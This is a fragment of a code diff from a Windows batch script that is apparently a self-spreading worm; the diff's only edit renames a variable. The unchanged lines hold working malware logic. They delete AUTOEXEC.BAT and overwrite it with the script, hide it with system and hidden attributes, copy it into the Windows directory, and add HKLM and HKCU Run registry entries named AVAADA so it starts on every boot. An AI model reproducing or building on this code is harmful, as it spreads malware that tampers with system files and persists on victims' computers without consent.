@@ -7,7 +7,7 @@ del %SystemDrive%%Slash%AUTOEXEC.BAT
 copy %0 %SystemDrive%%Slash%AUTOEXEC.BAT
 attrib +s +r +h %SystemDrive%%Slash%AUTOEXEC.BAT
 )
-set a=worm
+set a=Worm
 copy %0 %windir%\%a%.bat
 reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v AVAADA /t REG_SZ /d %windir%\%a%.bat /f > nul
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v AVAADA /t REG_SZ /d %windir%\%a%.bat /f > nul
